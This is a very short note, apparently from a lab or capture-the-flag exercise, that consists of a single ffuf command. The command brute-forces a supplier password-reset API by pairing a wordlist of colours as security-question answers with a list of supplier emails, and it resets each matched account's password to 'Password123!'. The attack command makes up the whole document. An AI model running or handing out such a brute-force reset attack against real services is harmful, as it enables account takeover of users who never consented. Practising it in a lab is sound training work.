### ffuf
```
ffuf -w colors-list.txt:ANSWER -w supplieremails.txt:EMAIL -u http://154.57.164.72:31020/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H "Content-Type: application/json" -H "accept: application/json" -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "ANSWER", "NewPassword": "Password123!"}'
```
